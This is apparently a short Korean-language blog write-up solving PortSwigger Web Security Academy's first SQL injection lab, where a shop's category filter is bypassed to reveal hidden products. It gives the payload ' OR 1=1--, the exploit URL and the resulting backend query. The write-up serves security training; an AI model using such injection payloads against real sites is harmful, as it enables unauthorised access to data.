---
title: "SQL Injection - Lab 1: WHERE clause"
date: 2026-03-02
draft: false
categories: ["portswigger"]
series: ["PortSwigger SQLi Labs"]
difficulty: "Easy"
tags: ["sql-injection", "where-clause", "bypass"]
thumbnail: ""
ctf_name: "PortSwigger Web Security Academy"
points: 0
flag: ""
---

## Overview

SQL injection 취약점을 이용해 WHERE 절을 우회하는 기초 랩입니다.

## Analysis

### 문제 설명

쇼핑몰 사이트의 카테고리 필터 기능에 SQL Injection이 존재합니다. `category` 파라미터를 조작해서 숨겨진 상품을 노출시키는 게 목표입니다.

### 페이로드

```sql
' OR 1=1--
```

## Exploitation

URL에 다음과 같이 입력:

```
/filter?category=' OR 1=1--
```

백엔드 쿼리:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

## Flag

Lab Solved ✅
